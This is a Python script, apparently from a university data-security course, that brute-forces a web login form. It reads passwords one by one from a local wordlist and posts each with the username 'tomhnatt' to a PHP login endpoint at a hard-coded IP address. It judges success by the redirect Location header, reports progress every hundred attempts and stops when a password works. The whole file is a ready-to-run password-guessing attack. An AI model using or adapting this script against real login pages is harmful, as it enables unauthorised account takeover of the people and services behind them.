import requests

# Configuration
login_url = "http://158.39.188.211/functions/passcheck12.php"
username = "tomhnatt"
password_file_path = "/Users/stefan/Documents/Dev/Informatikk_HIOF/Datasikkerhet/extended_default_passwords.txt"
failure_indicator = "../index.php?page=kit12"  # Indicator of a failed login

# Headers dictionary with the custom User-Agent
headers = {
    'User-Agent': 'TomHeineBrowser V.77'
}

# Function to attempt login with a given password
def attempt_login(password):
    data = {
        'username': username,
        'password': password,
    }
    # Include the headers with the custom User-Agent in the POST request
    response = requests.post(login_url, headers=headers, data=data, allow_redirects=False)
    # Check the Location header to see if it indicates a failed login
    location_header = response.headers.get('Location', '')
    if failure_indicator in location_header:
        return False  # Failed login attempt
    else:
        print(f"Success! Password is: {password}")
        return True  # Potential successful login

# Main logic
counter = 0
with open(password_file_path, 'r') as file:
    for line in file:
        password = line.strip()
        counter += 1
        if counter % 100 == 0:  # Print a message every 100 attempts to show progress
            print(f"Attempted {counter} passwords. Current: {password}")
        if attempt_login(password):
            print(f"Found successful password: {password}")
            break
    else:
        # This else clause belongs to the for loop and is executed when the loop completes normally (no breaks)
        print("Completed all attempts. No solution found.")
